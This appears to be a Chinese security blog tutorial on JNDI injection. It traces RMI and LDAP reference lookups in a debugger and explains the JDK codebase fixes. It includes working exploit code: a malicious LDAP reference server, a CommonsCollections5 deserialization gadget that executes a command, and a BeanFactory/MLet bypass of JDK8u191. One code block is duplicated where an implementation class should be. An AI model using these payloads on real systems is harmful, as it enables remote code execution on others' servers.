在了解JNDI之前我们需要了解一下相关的前置知识。

#### 命名和目录的相关概念

在计算机系统中每一个基本设施都是命名服务，就是名称和对象关联之后，然后通过名称查找到对象，比如说你要访问系统中的文件，你需要提供相应的名称，命名服务才会给你去查找，再比如说一个网址对应一个服务器ip，说白了就是一对一这种操作。其实跟RMI是类似的，你去绑定一个远程对象到注册中心，那么你必须提供一个名字，如果客户端调用的时候，方便他去查找。

借官方一张图:

如下图就是Name1 对应的就是Object1。

![](./img/1537697763077979665.png)

#### 对象引用

根据命名服务的不同，有些对象是不能由命名服务进行存储。但是他们是可以通过引用地址存储的，也就是说，对象的指针或引用被放在了命名服务中，这里我的理解是，比如说在java中一般栈中存储的都是对象的引用地址地址。

通常引用可用于与对象通信的特征，而对象本身拥有更多的信息。

这句话的意思是比如说你的身份证号对应的就是你，那么身份号中体现的信息是具有代表性的，更多的信息，比如你的爱好，是否结婚等等这些是你拥有的更多的信息。说白了引用就是代表的一些信息，但是并不是更多详细的信息。

如下是官方的举例：

例如，飞机对象可能包含飞机乘客和机组人员的列表、其飞行计划、燃料和仪器状态以及其航班号和起飞时间。相比之下，飞机对象引用可能仅包含其航班号和出发时间。

#### 上下文对象

上下文是一组名称到对象的绑定 _。_ 每个上下文都有一个关联的命名约定。上下文总是提供返回对象的查找（
_解析）操作，它通常还提供诸如绑定名称、取消绑定名称和列出绑定名称之类的操作。_

#### 目录

命名服务都是通过目录服务进行扩展，目录服务将名称与对象关联起来，并且将这些对象和属性相关联。

目录服务=命名服务+包含属性的对象

![](./img/4263926350596243083.png)

#### JNDI 概述

Java 命名和目录接口™ (JNDI) 是一种应用程序编程接口 (API)，它为使用 Java™
编程语言编写的应用程序提供[命名](https://docs.oracle.com/javase/tutorial/jndi/overview/naming.html)和[目录功能。](https://docs.oracle.com/javase/tutorial/jndi/overview/dir.html)它被定义为独立于任何特定的目录服务实现。因此，可以以通用方式访问各种目录——新的、新兴的和已经部署的。

#### 实例1-JNDI服务演示

首先这里做的测试是JNDI+RMI

首先定义一个RMI远程对象的接口以及实现类。

    
    
    package com.jndi;
    
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    
    public interface IRemote extends Remote {
        public String sayHello(String keywords) throws RemoteException;
    }
    
    
    
    package com.jndi;
    
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    
    public interface IRemote extends Remote {
        public String sayHello(String keywords) throws RemoteException;
    }
    

定义JNDIServer

在JNDIServer中通过上下文对象InitialContext将远程对象和rmi://localhost:1099/remoteObj地址进行绑定。

    
    
    package com.jndi;
    
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    
    public class JNDIRMIServer {
        public static void main(String[] args) throws Exception {
            InitialContext context = new InitialContext();
            context.rebind("rmi://localhost:1099/remoteObj",new IRemoteImpl());
    
        }
    }
    

定义JNDIClient

通过上下文对象将上一步绑定的远程对象通过绑定的地址查找出来，然后调用方法。

    
    
    package com.jndi;
    
    import javax.naming.InitialContext;
    
    public class JNDIRMIClient {
        public static void main(String[] args) throws Exception{
            InitialContext context = new InitialContext();
            IRemote iRemote = (IRemote) context.lookup("rmi://localhost:1099/remoteObj");
            iRemote.sayHello("user");
        }
    }
    

如下图:

可以看到在JNDI服务端成功调用。

![](/Users/relay/Library/Application Support/typora-user-images/image-20230808221836416.png)

![](./img/8997214136738677655.png)

#### JNDI通过对象引用查找

对象应用在上面介绍过了，在JNDI中对象引用使用的是Reference这个类，这个类说白了就是对于有些对象不能直接由命名服务进行存储的封装，封装之后就可以由命名服务进行存储了。

那么这个类需要传递三个参数，第一个参数表示类名，第二个是工厂的名字，第三个是工厂的地址。

![](./img/1218191881684690685.png)  
紧接着通过上下文对象对这个引用进行绑定。我们跟进去这个绑定看看他是如何操作的。

首先来到rebind方法，调用getURLOrDefaultInitCtx方法返回一个rmiURLContext类，这个类继承了GenericURLContext，会调用到的GenericURLContext类的rebind方法。

![](./img/8222086067411515340.png)  
紧接着会来到RegistryContext的rebind方法，跟进。

![](./img/5365139353100472585.png)  
这里我们可以发现最后调用的其实是Rgistryimpl_Stub的rebind方法，和RMI是类似的，可以发现他传递了两个参数，第一个参数remoteObj，那么第二个参数其实就是我们的reference引用，但是这里调用了一个encodeObject方法我们跟进去。

![](./img/930397009734956285.png)  
在encodeObject方法中，这里会将我们的reference进行了转换，转换成了ReferenceWrapper这个类，这个类我们后面在去调用lookup的时候会看到这个类，那么这里我们就先结束，紧接着来看客户端这里是怎么走的。

![](./img/9131065587693592400.png)  
首先在客户端lookup这里下断点。

![](./img/1016923840010791357.png)  
来到lookup方法，可以发现我们来到了GenericURLContext这个类的lookup方法，可以发现我们在调用rebind方法的时候，也来到了这个方法的rebind方法。跟进var3.lookup方法。

![](./img/8221009750826237810.png)  
这里会调用RegistryImpl_Stub的lookup方法，是不是感觉和上面的是差不多的，上面调用的是Rgistryimpl_Stub的rebind方法，紧接着我们发现var2返回的是ReferenceWrapper_Stub，这里我们就熟悉了，这个类是我们前面在rebind哪里看到他转换后的类，原本是reference，经过转换之后变成了ReferenceWrapper_Stub，那么在rebind做了一个encoding，那么在lookup这里就需要做一个decodeObject的操作了，我们跟进去。

![](./img/404389497398693065.png)  
首先判断ReferenceWrapper_Stub是不是RemoteReference类型的，ReferenceWrapper_Stub继承了RemoteReference，所以条件成立，他会将ReferenceWrapper_Stub转换成Reference，然后调用NamingManager的getObjectInstance方法，跟进。

![](./img/2838493941485826816.png)  
前面这些代码都不是太重要，来到getObjectFactoryFromReference方法这里，跟进。

![](./img/4377248300358201256.png)  
首先来看他的参数，第一个参数就是我们的Reference，这里面存储着我们传递的类名，工厂名，工厂地址。factoryName就是工厂名。

![](./img/8454208073713390467.png)  
在这里他调用了loadClass方法，将工厂名传递进去，我们跟进。

![](./img/1922964368402161237.png)  
来到这里，他会直接通过反射进行类加载，这里使用的是AppClassLoader类加载器，到这里我们就知道了他其实先去本地进行加载，如果本地没有的话，再去我们的工厂地址这个URL下去加载。我们出去。

![](./img/7924670797960245176.png)  
这里会将我们的工厂地址赋值给codebase，然后将codebase作为参数传递到loadClass方法中，跟进。

![](./img/8918930688774256882.png)  
可以看到在这里的loadClass中，他首先会创建一个URLClassloader，将codebase传递进去，然后调用loadClass方法。  
这里会进行类的加载，那么当类加载的时候静态代码块也会跟着执行。

![](./img/5811866085696883417.png)

![](./img/7767312062520633338.png)  
如果你的恶意代码没有写在静态代码块中，而是写在了构造器中，那么需要类的一个初始化才会执行。

我们返回，返回到codebase这里，最后会进行类的初始化。

![](./img/578776426282259360.png)  
以上就是JNDI通过对象引用查找导致的安全问题。

对于如上的利用方式Java在JDK6u132 7u122 以及8u133中进行了限制。

修复是在RegistryContext这个类中，这里判断加了一个trustURLCodebase这个值，他默认为false，需要我们手动打开，如果不成立的话他会直接抛出异常，不让我们远程加载。

![](./img/1865328592091801538.png)

![](./img/5043486224034035416.png)

#### JNDI/Ldap

Ldap是一个轻目录访问协议，这个协议和windows域中的ldap协议是差不多的。

这里的协议我们不需要了解的太多，这个只是一种利用方式，因为在JDK8u133中禁用了其他两种加在远程对象，ldap被遗漏了，但是在JDK8U191中也将trustURLCodebase设置为了false。

创建一个Ldap服务，这里可以使用Apache Directory Studio来进行创建，也可以使用如下方式进行创建，这里其实推荐大家使用Apache
Directory Studio工具来进行创建是比较简单的。

如下代码来自: <https://xz.aliyun.com/t/8214#toc-2>

如下需要更改的是<http://127.0.0.1/#testRef>
这里的testRef就是你生成的class文件，需要使用python3开启一个web服务。

    
    
    import java.net.InetAddress;
    import java.net.MalformedURLException;
    import java.net.URL;
    
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPException;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    
    public class LDAPRefServer {
    
        private static final String LDAP_BASE = "dc=example,dc=com";
    
        public static void main ( String[] tmp_args ) {
            String[] args=new String[]{"http://127.0.0.1/#test"};
            int port = 7777;
    
            try {
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen", //$NON-NLS-1$
                        InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));
    
                config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
                InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                ds.startListening();
    
            }
            catch ( Exception e ) {
                e.printStackTrace();
            }
        }
    
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
    
            private URL codebase;
    
            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }
    
            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }
    
            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if ( refPos > 0 ) {
                    cbstring = cbstring.substring(0, refPos);
                }
                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }
    }
    

客户端的代码:  
在这里

    
    
    package com.jndi;
    
    import javax.naming.InitialContext;
    
    public class JNDIRMIClient {
        public static void main(String[] args) throws Exception{
            InitialContext context = new InitialContext();
            IRemote iRemote = (IRemote) context.lookup("ldap://127.0.0.1:7777/testRef");
    //        iRemote.sayHello("user");
        }
    }
    

可以发现在执行客户端代码的时候这里已经有请求过来了。

![](./img/3349476563307812596.png)  
这里也成功执行

![](./img/3834409725765067982.png)  
我们跟一遍流程看他是如何操作的，下断点到lookup方法。

来到ldapurlContext的lookup方法，可以看到在我们使用RMI和JNDI的时候，他会跳到RMIURLContext类中，而在ldap中他会跳到LdapUrlContext中。

![](./img/8390790896780654135.png)  
最后会来到LdapCtx类的c_lookup方法，在这个类中，和我们前面调试RMI的时候是差不多的，也是通过decodeObject转换成Reference，然后调用DirectoryManager的DirectoryManager方法。

![](./img/1873390310591645260.png)  
具体的调用栈如下:

![](./img/8073986363363434355.png)  
来到getObjectInstance方法，这个方法中他会调用本类的getObjectFactoryFromReference方法。

![](./img/6064234866642882627.png)  
这里其实就跟RMI是一样的了，也是先从本地进行加载，如果本地没有的话，那么从远程进行加载，并初始化。

![](./img/7185073316847595421.png)

Ldap中的该方法在JDK 11.0.1 8U191 7u201 6u211中也进行了修复，trusURLCodebase的属性默认也是为false。

#### JDK8U191绕过

##### 反序列化绕过

创建一个JNDIRefServer端。

    
    
    package com.jndi;
    
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import javax.management.BadAttributeValueExpException;
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.net.InetAddress;
    import java.net.URL;
    import java.util.HashMap;
    import java.util.Map;
    
    public class LdapRefServer {
        private static final String LDAP_BASE = "dc=example,dc=com";
    
        public static void main ( String[] tmp_args ) throws Exception{
            String[] args=new String[]{"http://127.0.0.1/#testRef"};
            int port = 6666;
    
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
    
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }
    
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
    
            private URL codebase;
    
            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }
    
            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }
    
            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
                URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf('#');
                if ( refPos > 0 ) {
                    cbstring = cbstring.substring(0, refPos);
                }
    
                e.addAttribute("javaSerializedData",CommonsCollections5());
    
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }
    
        private static byte[] CommonsCollections5() throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open -a Calculator"})
            };
    
            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);
    
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();
    
            return byteArrayOutputStream.toByteArray();
        }
    
    }
    

客户端还是上面写的，我们这里跟一下代码。进入decodeObject方法，这里的var4就是从Jndi服务器中获取到的属性。

![](./img/9161178478757582893.png)  
在这里首先这里的JAVA_ATTRIBUTES表示的是如下这7个值，然后去我们传递过来的属性中查找有没有这些对应的key，这里查找的是第四个，那么也就是javaCodeBase，我们属性是没有这个值的，所以返回null。紧接着去查找属性中的第一个值也就是javaSerializedData，这个值属性中是存在的，所以找到了attrs的第一个属性。然后赋值给了var1。

![](./img/6313089612884079051.png)  
紧接着获取到类加载器也就是AppClassLoader，然后调用deserializeObject方法进行反序列化操作，这里传进去的值就是我们的var1和var3。我们跟进去

![](./img/6043571669121072315.png)  
此时var0就是我们序列化的数据，var1则为类加载器。最后会调用readObject进行反序列。

![](./img/3550834339244667418.png)  
这里的话其实我们注意到只有我们ldap服务器中的属性为javaSerializedData的时候，才会调用deserializeObject进行反序列化，所以我们恶意的数据可以写在javaSerializedData中。

![](./img/1538618236043360370.png)  
如上就是反序列化的绕过，需要目标本地存在相应的Gadgets。

##### BeanFactory绕过

我们前面知道在JDK8U191的时候他会进行判断trustURLCodebase，从而进行修复。

那么我们核心的代码其实就在这里。

这里会进行判断，如果var8也就是我们的ResourceRef不为空的话，并且他的工厂地址也不为空的话，取反trustURLCodebase，因为trustURLCodebase默认为false，所以取反之后就变成了true，这些条件都成立的话他就会抛出异常，所以说我们要打破条件，让他其中一个判断不能为true。

![](./img/1544034715859222707.png)  
那么这里选择的是将工厂地址设置为null，条件就不会成立了。

我们来看一下服务端代码的第一段，我们可以看到创建的是一个ResourceRef对象，而这个对象继承了Reference，并且在ResourceRef的构造器中，调用了他父类的构造器，也就是说ResourceRef的构造器中调用了Reference的构造器，并将resourceClass，factory，factoryLocation这三个值传递了进去。

    
    
    ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
    

![](./img/8542187352276418571.png)  
那么如上去，调用getfactoryclasslocation方法的时候，ResourceRef这个子类中是没有的，所以会调用到他的父类中获取工厂地址。

那么现在条件已经被打破了，我们来到NamingManager.getObjectInstance方法。这里首先判断我们的ResourceRef是不是Reference类型的，这里肯定是的，因为Reference是ResourceRef父类，然后将refInfo强制转换Reference。

![](./img/3936441979064781234.png)  
紧接着这里调用getFactoryClassName获取到工厂的名称，也就是org.apache.naming.factory.BeanFactory，紧接着跟进getObjectFactoryFromReference方法。

![](./img/7276464151083758722.png)  
这里我们我们就会通过类加载去加载自己本地的类也就是BeanFactory。加载完成之后进行初始化。

![](./img/2278907317419964869.png)  
那么此时的factory就是BeanFactory，紧接着调用BeanFactory的getObjectInstance方法，这里会传递进去三个参数，第一个参数就是我们的ResourceRef，第二个name就是exp这个名字，第三个就是RegistryContext。

![](./img/3874790361337601679.png)  
来到这里，首先会判断ResourceRef是否是ResourceRef类型，那么肯定是的，然后调用ref的getClassName获取到我们传递进去的类名，这个className这个值是通过ResourceRef的构造器中给他父类Reference赋值的。如下:

    
    
    super(resourceClass, factory, factoryLocation);
    

Reference类构造器:

    
    
    public Reference(String className, String factory, String factoryLocation) {
        this(className);
        classFactory = factory;
        classFactoryLocation = factoryLocation;
    }
    

紧接着创建一个AppClassloader类加载器，然后去加载了传递进去的类路径，也就是javax.management.loading.MLet，至于为什么不是ELProcessor可以参考这篇文章<https://tttang.com/archive/1405/，这里只是证明他做了类加载即可。>

![](./img/210680677765887026.png)  
紧接着来到下面一段，首先对刚才类加载的类进行初始化，然后Refenece的get方法去获取forceString对应的值。

对应如下代码:

    
    
    ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
    

这里获取到的就是：

![](./img/691761590086886404.png)  
紧接着判断if如果不等于null的话，那么就获取到他的contents值，也就是a=loadClass,b=addURL,c=loadClass。

然后再将String.class作为参数放到paramTypes这个数组中。

![](./img/1135413869559893439.png)  
这里使用for循环进行遍历a=loadClass,b=addURL,c=loadClass这个值，使用split方法使用逗号分割然后返回一个String类型的数组。

进行循环，去除空格，然后分别调用subString方法,将a=loadClass分割之后，将loadClass字符串赋值给setterName，a赋值给了param。

然后调用getMethod方法，这里调用的是上面做过实例化的也就是MLet这个类获取他的loadClass方法，然后将上面的paramTypes这个数组中的String.class作为参数进行传递进去，现在就变成了这样。

    
    
    Mlet.getMethod("loadClass",String.class)
    

然后将param也就是a，作为key，Mlet.getMethod("loadClass",String.class)返回的值作为value存储到forced这个Map中。

![](./img/2050931325285906788.png)  
剩下的就会依次类推，就比如说b=addURL,c=loadClass，这些等等。

此时这个forced中的值为:

![](./img/7420650214622054219.png)  
紧接着调用getAll方法，获取到所以的值也就是这里进行添加的值。

![](./img/17373548170087807.png)  
紧接着调用getType，获取到addType这个值。

![](./img/4057120971184447468.png)  
然后就开始判断我们这些addrType是不是factory，scope，forceString，singleton这些个值，如果是这些值的话就直接continue。

![](./img/6751701387318935683.png)  
那么也就是说其实获取到的值就是我们这些个值。

    
    
    ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
    ref.add(new StringRefAddr("b", "http://127.0.0.1:8888/"));
    ref.add(new StringRefAddr("c", "Blue"));
    

然后获取到content，也就是javax.el.ELProcessor等等。

然后从forced这个Map中获取到我们上面存储进去的那些个方法。获取到方法之后，然后判断如果不为null，那么就调用invoke去执行方法。这里的bean是Mlet，参数的就是javax.el.ELProcessor。

![](./img/3811132829564555928.png)  
可以发现当执行完invoke方法之后，这里就会产生相关的请求。

![](./img/4535504530179673734.png)  
整体代码:

    
    
    package com.jndi;
    
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import javax.naming.StringRefAddr;
    import org.apache.naming.ResourceRef;
    
    
    public class LocalRmiServer {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.createRegistry(1099);
    //       ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
    //        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
    //        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"gnome-calculator\")"));
    //        ReferenceWrapper refObjWrapper = new ReferenceWrapper(resourceRef);
    //        registry.bind("exp", refObjWrapper);
    //        System.out.println("Creating evil RMI registry on port 1099");
            ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
            ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
            ref.add(new StringRefAddr("b", "http://127.0.0.1:8888/"));
            ref.add(new StringRefAddr("c", "Blue"));
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
            registry.bind("exp", refObjWrapper);
        }
    }
    

如上就是绕过8U191的二种方式。

参考:

<https://tttang.com/archive/1405/>

<http://tttang.com/archive/1611/#toc_jndi-references>

<https://xz.aliyun.com/t/8214#toc-3>

